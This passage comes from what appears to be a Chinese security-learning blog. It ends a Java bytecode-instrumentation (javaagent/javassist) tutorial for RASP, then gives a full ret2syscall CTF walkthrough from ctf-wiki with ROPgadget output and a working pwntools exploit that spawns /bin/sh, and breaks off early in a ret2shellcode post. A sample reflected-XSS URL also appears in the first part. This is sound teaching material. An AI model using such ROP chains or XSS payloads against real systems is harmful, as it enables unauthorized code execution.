invokeClass.getName();</span><br><span class="line">        src = invokeClassName + <span class="string">'.'</span> + methodName + <span class="string">"("</span> + paramString + <span class="string">");"</span>;</span><br><span class="line">        src = <span class="string">"try &#123;"</span> + src + <span class="string">"&#125; catch (Throwable t) &#123;throw t;&#125;"</span>;</span><br><span class="line">        <span class="keyword">return</span> src;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们一个一个来看，这里的checkReadFile是插入到字节码中被调用的函数，getInvokeStaticSrc是用来生成插入的代码，即到时候我们插入到class文件里的代码。retransform是用来重新转换已修改的类，因为在permian之前已经有类被加载到jvm中，这样在premain之前加载的类，主要是系统类就不会被修改，需要通过retransform进行重新加载。ClassTransformer方法之后会讲到，主要是用来让jvm使用我们编写的类加载器。</p>
<p>这里主要讲讲transform函数，继承ClassFileTransformer接口后，当实现transform方法后，在permain加载后会调用transform方法里的逻辑，进行加载类的修改。</p>
<p>通过</p>
<p><code>ClassPool classPool = ClassPool.getDefault();</code></p>
<p>获取所有加载的类</p>
<p>通过</p>
<p><code>ctClass = classPool.makeClass(new ByteArrayInputStream(classfileBuffer));</code></p>
<p>创建目标类</p>
<p>通过</p>
<p><code>CtBehavior ctMethod = ctClass.getConstructor(&quot;(Ljava/io/File;)V&quot;);</code></p>
<p>获取目标类的目标函数</p>
<p>通过</p>
<p><code>ctMethod.insertBefore(checkSqlSrc);</code></p>
<p>在目标函数的最前面插入代码，<code>checkSqlSrc</code>通过getInvokeStaticSrc函数生成要插入的代码，这里不进行详述，最简单的只是插入一串打印字符的如下</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">checkSqlSrc=<span class="string">"&#123;System.out.println(\"This is checkSqlSrc\");&#125;"</span></span><br></pre></td></tr></table></figure>

<p>这里实现的逻辑是在系统类的FileInputStream函数执行前先执行checkReadFile函数的内容。</p>
<h5 id="Instrumentation"><a href="#Instrumentation" class="headerlink" title="Instrumentation"></a>Instrumentation</h5><p>现在字节码是修改完了，可是 JVM 在执行时会使用自己的类加载器加载字节码文件，加载后并不会理会我们做出的修改，要想实现对现有类的修改，我们还需要搭配 Java 的另一个库 instrument。</p>
<p>instrument 是 JVM 提供的一个可以修改已加载类文件的类库。1.6以前，instrument 只能在 JVM 刚启动开始加载类时生效，之后，instrument 更是支持了在运行时对类定义的修改。</p>
<p>要使用 instrument 的类修改功能，我们需要实现它的 ClassFileTransformer 接口定义一个类文件转换器。它唯一的一个 transform() 方法会在类文件被加载时调用，在 transform 方法里，我们可以对传入的二进制字节码进行改写或替换，生成新的字节码数组后返回，JVM 会使用 transform 方法返回的字节码数据进行类的加载。</p>
<p>这些工作我们在上面的代码里已经实现了，在ClassTransformer函数中使用<code>instrumentation.addTransformer</code>将转换方法加载进来。</p>
<p>最后我们回到Agent类中，修改一下permain函数</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">premain</span><span class="params">(String args, Instrumentation instrumentation)</span> </span>&#123;</span><br><span class="line">    System.out.println(<span class="string">"This is premain here"</span>);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">//  将当前jar文件加入到了jdk的根路径下</span></span><br><span class="line">        JarFileHelper.addJarToBootstrap(instrumentation);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    transformer = <span class="keyword">new</span> ClassTransformer(instrumentation);</span><br><span class="line">    transformer.retransform();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里通过</p>
<p><code>transformer = new ClassTransformer(instrumentation);</code></p>
<p>让让JVM 能够调用我们提供的类转换器</p>
<p>注意：当转换系统类的时候，需要将当前jar文件加入到了jdk的根路径下。</p>
<p>最后将Agent打包生成jar包，通过运行时使用javaagent参数配置我们的agent</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">E:\myrasp\testforasp\mytest\target&gt;java -javaagent:myagent-0.0.1-jar-with-dependencies.jar -jar mytest-0.0.1-jar-with-dependencies.jar</span><br><span class="line">This is premain here</span><br><span class="line">java&#x2F;io&#x2F;FileInputStream</span><br><span class="line">is method checkReadFile</span><br><span class="line">C:\Program Files\Java\jre1.8.0_251\lib\security\java.security</span><br><span class="line">This is main here</span><br><span class="line">is method checkReadFile</span><br><span class="line">E:\myrasp\url.txt</span><br><span class="line">.&#x2F;catalina.sh jpda start</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;java-sec-code-1.0.0&#x2F;xss&#x2F;reflect?xss&#x3D;%3Cscript%3Ealert(1)%3C&#x2F;script%3E</span><br></pre></td></tr></table></figure>

<p>可以看到我们完成了动态字节码注入，在不改变主程序代码的情况下，插入了额外的逻辑。</p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>探针技术其实就是动态或者说运行时修改类，大的方向说有2种方式：</p>
<ol>
<li>使用 agentmain，不需要重新创建类加载器，可直接修改类，但是有很多限制。</li>
<li>使用 premain 可以在类第一次加载之前修改，加载之后修改需要重新创建类加载器。或者在自定义的类加载器种修改，但这种方式比较耦合。</li>
</ol>
<p>无论是哪种，都需要字节码修改的库，比如ASM，javassist ，cglib 等，很多。总之，通过java.lang.instrument 包配合字节码库，可以很方便的动态修改类，或者进行热部署。</p>
<p>目前用的Java探针的应用主要有APM和RASP两种，APM即应用性能管理软件，在程序运行的时候监控程序性能的情况，另一种RASP（Runtime application self-protection）是一种应用安全防护的新形式，在应用中添加安全防护逻辑，相比于WAF来说RASP可以获取到应用上下文内容，可以更加精确，更少漏报。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://github.com/s0nnse/2020/06/01/%E4%BB%8Eret2syscall%E5%85%A5%E5%9D%91%E6%A0%88%E6%BA%A2%E5%87%BA/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="s0nnse">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="s0nnse">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2020/06/01/%E4%BB%8Eret2syscall%E5%85%A5%E5%9D%91%E6%A0%88%E6%BA%A2%E5%87%BA/" class="post-title-link" itemprop="url">从ret2syscall入坑栈溢出</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2020-06-01 22:04:31" itemprop="dateCreated datePublished" datetime="2020-06-01T22:04:31+08:00">2020-06-01</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2020-06-11 21:15:58" itemprop="dateModified" datetime="2020-06-11T21:15:58+08:00">2020-06-11</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h4 id="ret2syscall原理"><a href="#ret2syscall原理" class="headerlink" title="ret2syscall原理"></a>ret2syscall原理</h4><p>ret2syscall即控制程序执行系统调用，获取shell。</p>
<h4 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h4><p>以<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/readme-zh/" target="_blank" rel="noopener">ctf-wiki</a>中的ret2syscall程序为例，主要内容与ctf-wiki一致，其中穿插补充一些学习中所遇到的疑惑点。</p>
<p>首先检测程序开启的保护。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~/PWN$ checksec --file=ret2syscall</span><br><span class="line">[*] '/home/kali/PWN/ret2syscall'</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>

<p>可以得知为32位程序，开启NX保护（即No-eXecute，也就是数据不可执行，防止因为程序运行出现溢出而使得攻击者的shellcode可能会在数据区尝试执行的情况。）</p>
<p>通过IDA查看源码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [esp+1Ch] [ebp-64h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"This time, no system() and NO SHELLCODE!!!"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"What do you plan to do?"</span>);</span><br><span class="line">  gets(&amp;v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看出此次仍然是一个栈溢出。类似于之前的做法，我们可以获得 v4 相对于 ebp 的偏移为 108。所以我们需要覆盖的返回地址相对于 v4 的偏移为 112。此次，由于我们不能直接利用程序中的某一段代码或者自己填写代码来获得 shell，所以我们利用程序中的 gadgets 来获得 shell，而对应的 shell 获取则是利用系统调用。</p>
<p>关于系统调用的知识，请参考</p>
<ul>
<li><a href="https://zh.wikipedia.org/wiki/系统调用" target="_blank" rel="noopener">https://zh.wikipedia.org/wiki/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8</a></li>
</ul>
<p>这里把wiki中的关键信息摘抄一下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">应用程序调用系统调用的过程是：</span><br><span class="line"></span><br><span class="line">1. 把系统调用的编号存入 EAX；</span><br><span class="line">2. 把函数参数存入其它通用寄存器；</span><br><span class="line">3. 触发 0x80 号中断（int 0x80）。</span><br></pre></td></tr></table></figure>

<p>只要我们把对应获取 shell 的系统调用的参数放到对应的寄存器中，那么我们在执行 int 0x80 就可执行对应的系统调用。比如说这里我们利用如下系统调用来获取 shell</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">execve(<span class="string">"/bin/sh"</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>)</span><br></pre></td></tr></table></figure>

<p>其中，该程序是 32 位，所以我们需要使得</p>
<ul>
<li>系统调用号，即 eax 应该为 0xb</li>
<li>第一个参数，即 ebx 应该指向 /bin/sh 的地址，其实执行 sh 的地址也可以。</li>
<li>第二个参数，即 ecx 应该为 0</li>
<li>第三个参数，即 edx 应该为 0</li>
</ul>
<p>控制这些寄存器的值需要使用gadgets。比如说现在栈顶是10，此时如果执行<code>pop eax</code>，那么现在eax的值就是10。但是我们并不能期待有一段连续的代码可以同时控制对应的寄存器，所以我们需要一段一段控制，这也是我们在 gadgets 最后使用 ret 来再次控制程序执行流程的原因。具体寻找 gadgets 的方法，我们可以使用 ropgadgets 这个工具。</p>
<p>首先，我们来寻找控制 eax 的 gadgets</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~/PWN/ROPgadget$ python3 ROPgadget.py --binary /home/kali/PWN/codes/ret2syscall --only 'pop|ret' |grep 'eax'</span><br><span class="line">0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x080bb196 : pop eax ; ret</span><br><span class="line">0x0807217a : pop eax ; ret 0x80e</span><br><span class="line">0x0804f704 : pop eax ; ret 3</span><br><span class="line">0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br></pre></td></tr></table></figure>

<p>可以看到有上述几个都可以控制 eax，这里选取第二个来作为 gadgets。</p>
<p>类似的，我们可以得到控制其它寄存器的 gadgets</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~/PWN/ROPgadget$ python3 ROPgadget.py --binary /home/kali/PWN/codes/ret2syscall --only 'pop|ret' |grep 'ebx'</span><br><span class="line">0x0809dde2 : pop ds ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0805b6ed : pop ebp ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0809e1d4 : pop ebx ; pop ebp ; pop esi ; pop edi ; ret</span><br><span class="line">0x080be23f : pop ebx ; pop edi ; ret</span><br><span class="line">0x0806eb69 : pop ebx ; pop edx ; ret</span><br><span class="line">0x08092258 : pop ebx ; pop esi ; pop ebp ; ret</span><br><span class="line">0x0804838b : pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x080a9a42 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x10</span><br><span class="line">0x08096a26 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x14</span><br><span class="line">0x08070d73 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0xc</span><br><span class="line">0x08048547 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 4</span><br><span class="line">0x08049bfd : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 8</span><br><span class="line">0x08048913 : pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x08049a19 : pop ebx ; pop esi ; pop edi ; ret 4</span><br><span class="line">0x08049a94 : pop ebx ; pop esi ; ret</span><br><span class="line">0x080481c9 : pop ebx ; ret</span><br><span class="line">0x080d7d3c : pop ebx ; ret 0x6f9</span><br><span class="line">0x08099c87 : pop ebx ; ret 8</span><br><span class="line">0x0806eb91 : pop ecx ; pop ebx ; ret</span><br><span class="line">0x0806336b : pop edi ; pop esi ; pop ebx ; ret</span><br><span class="line">0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret</span><br><span class="line">0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0806eb68 : pop esi ; pop ebx ; pop edx ; ret</span><br><span class="line">0x0805c820 : pop esi ; pop ebx ; ret</span><br><span class="line">0x08050256 : pop esp ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x0807b6ed : pop ss ; pop ebx ; ret</span><br></pre></td></tr></table></figure>

<p>这里选择</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret</span><br></pre></td></tr></table></figure>

<p>这个可以直接控制其它三个寄存器。</p>
<p>此外，我们需要获得 /bin/sh 字符串对应的地址。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~/PWN/ROPgadget$ python3 ROPgadget.py --binary /home/kali/PWN/codes/ret2syscall --string '/bin/sh'</span><br><span class="line">Strings information</span><br><span class="line">============================================================</span><br><span class="line">0x080be408 : /bin/sh</span><br></pre></td></tr></table></figure>

<p>此外，还有 int 0x80 的地址</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~/PWN/ROPgadget$ python3 ROPgadget.py --binary /home/kali/PWN/codes/ret2syscall --only 'int'</span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x08049421 : int 0x80</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 1</span><br></pre></td></tr></table></figure>

<p>下面编写相应的 payload，其中 0xb 为 execve 对应的系统调用号。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">'./ret2syscall'</span>)</span><br><span class="line"></span><br><span class="line">pop_eax_ret = <span class="number">0x080bb196</span></span><br><span class="line">pop_edx_ecx_ebx_ret = <span class="number">0x0806eb90</span></span><br><span class="line">int_0x80 = <span class="number">0x08049421</span></span><br><span class="line">binsh = <span class="number">0x80be408</span></span><br><span class="line">payload = flat(</span><br><span class="line">    [<span class="string">'A'</span> * <span class="number">112</span>, pop_eax_ret, <span class="number">0xb</span>, pop_edx_ecx_ebx_ret, <span class="number">0</span>, <span class="number">0</span>, binsh, int_0x80])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<p>尝试运行一下，成功获取shell</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~/PWN/codes$ python3 ret2syscall.py </span><br><span class="line">[+] Starting local process './ret2syscall': pid 11735</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">This time, no system() and NO SHELLCODE!!!</span><br><span class="line">What do you plan to do?</span><br><span class="line"><span class="meta">$</span><span class="bash"> ls</span></span><br><span class="line">ret2shellcode      ret2syscall      ret2text     test</span><br><span class="line">ret2shellcode.py  ret2syscall.py  ret2text.py  test.c</span><br></pre></td></tr></table></figure>

<p>ret2syscall主要通过系统调用来获取shell，这里如果了解过汇编的知识，我想会比较容易理解。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://github.com/s0nnse/2020/05/31/%E4%BB%8Eret2shellcode%E5%85%A5%E5%9D%91%E6%A0%88%E6%BA%A2%E5%87%BA/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="s0nnse">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="s0nnse">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2020/05/31/%E4%BB%8Eret2shellcode%E5%85%A5%E5%9D%91%E6%A0%88%E6%BA%A2%E5%87%BA/" class="post-title-link" itemprop="url">从ret2shellcode入坑栈溢出</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2020-05-31 20:12:30" itemprop="dateCreated datePublished" datetime="2020-05-31T20:12:30+08:00">2020-05-31</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2020-06-01 22:02:56" itemprop="dateModified" datetime="2020-06-01T22:02:56+08:00">2020-06-01</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h4 id="ret2shellcode原理"><a href="#ret2shellcode原理" class="headerlink" title="ret2shellcode原理"></a>ret2shellcode原理</h4><p>ret2shellcode，即控制程序执行 shellcode 代码。shellcode 指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的 shell。一般来说，shellcode 需要我们自己填充。这其实是另外一种典型的利用方法，即此时我们需要自己去填充一些可执行的代码。</p>
<p>在栈溢出的基础上，要想执行 shellcode，需要对应的 binary 在运行时，shellcode 所在的区域具有可执行权限。</p>
<p>栈溢出的基本概念在ret2text中介绍过，这里不再重复，直接分析一个程序。</p>
<h4 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h4><p>以<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/readme-zh/" target="_blank" rel="noopener">ctf-wiki</a>中的ret2shellcode程序为例，主要内容与ctf-wiki一致，其中穿插补充一些学习中所遇到的疑惑点。</p>
<p>首先常规的先检测程序开启的保护</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~/PWN$ checksec --file=ret2shellcode</span><br><span class="line">[*] '/home/kali/PWN/ret2shellcode'</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>

<p>可以看到是一个32位程序，而且几乎没有开启任何保护，丢进IDA看一下。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+1Ch] [ebp-64h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"No system for you this time !!!"</span>);</span><br><span class="line">  gets(&amp;s);</span><br><span class="line">  <span class="built_in">strncpy</span>(buf2, &amp;s, <span class="number">0x64</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"bye bye ~"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>简单查看，可以看到输入数据读到s变量中，再复制到buf2处，这里因为代码里没有自带的system等获取shell的函数，所以不能使用ret2text，需要自己写入调用的函数。</p>
<p>这里先引入一下内存分配区域的知识</p>
<p>32位操作系统下为：1G内核态，3G用户态</p>
<p>BSS段 ：通常是指用来存放程序中未初始化的全局变量、静态变量（全局变量未初始化时默认为0）的一块内存区域</p>
<p>数据段（data） ：通常是指用来存放程序中 初始化后的全局变量和静态变量</p>
<p>代码段（text） ：通常是指用来存放程序中 代码和常量</p>
<p>堆（heap） ：通常是指用来存放程序中进程运行时被动态分配的内存段 ( 动态分配：malloc / new，者动态释放：free / delete)</p>
<p>栈 （stack）：通常是指用来存放程序中用户临时创建的局部变量、函数形参、数组（局部变量未初始化则默认为垃圾值）也就是说我们函数括弧“{}”中定义的变量（但不包括static声明的变量，static意味着在数据段中存放变量）。除此以外，在函数被调用时，其参数也会被压入发起调用的进程栈中，并且待调用结束后，函数的返回值也会被存放回栈中。由于栈的先进后出特点，所以栈特别方便用来保存/恢复调用现场。从这个意义上讲，我们可以把堆栈看成一个寄存、交换临时数据的内存区。它是由操作系统分配的，内存的申请与回收都由OS管理。</p>
<p>这里有个疑惑，s变量读入了数据，为什么不把shellcode直接写入s变量所在的空间执行，反而要多走一步到bss段再执行。变量s是保存在栈中的，而且NX disabled栈保护是关闭的。<strong>难道是因为s对应的地址是未知的？，留坑，没完全明白。</strong></p>
<p>接下来在IDA中通过双击buf2，查看buf2的信息。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.bss:0804A080 ; char buf2[100]</span><br><span class="line">.bss:0804A080 buf2            db 64h dup(?)           ; DATA XREF: main+7B↑o</span><br><span class="line">.bss:0804A080 _bss            ends</span><br></pre></td></tr></table></figure>

<p>查看可知buf2在bss段，有100个字节空间长度，在解释一下<code>db 64h dup(?)</code>的含义。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">db： 定义字节类型变量的伪指令</span><br><span class="line">dup()： 重复定义圆括号中指定的初值，次数由前面的数值决定</span><br><span class="line">?： 只分配存储空间，不指定初值</span><br></pre></td></tr></table></figure>

<p>接下来简单调试下程序，看看这里的bss段是否可以执行。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">pwndbg: loaded 192 commands. Type pwndbg [filter] for a list.</span><br><span class="line">pwndbg: created $rebase, $ida gdb functions (can be used with print/break)</span><br><span class="line">Reading symbols from ret2shellcode...</span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> b main</span></span><br><span class="line">Breakpoint 1 at 0x8048536: file ret2shellcode.c, line 8.</span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> r</span></span><br><span class="line">Starting program: 